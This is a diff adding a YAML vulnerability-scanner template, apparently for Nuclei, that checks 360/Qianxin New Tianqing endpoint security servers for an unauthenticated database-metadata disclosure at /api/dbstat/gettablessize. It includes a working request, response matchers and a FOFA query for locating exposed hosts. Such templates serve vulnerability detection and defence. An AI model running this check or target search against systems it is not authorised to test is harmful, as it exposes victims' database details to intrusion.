@@ -1,0 +1,30 @@
+id: qianxin-new-tianqing-gettablessize-disclosure
+info:
+  name: 360 奇安信 新天擎终端安全管理系统 - 信息泄露
+  author: leadlife
+  severity: medium
+  description: 360 奇安信 新天擎终端安全管理系统 /api/dbstat/gettablessize 存在信息泄露漏洞，攻击者可通过该漏洞获取系统中的部分敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/360%20%E6%96%B0%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title="360新天擎"
+  tags: 360,qianxin,disclosure,new-tianqing,tianqing
+
+http:
+  - raw:
+      - |
+        GET /api/dbstat/gettablessize HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "schema_name"
+          - "table_name"
+        condition: and
+
+      - type: status
+        status:
+          - 200
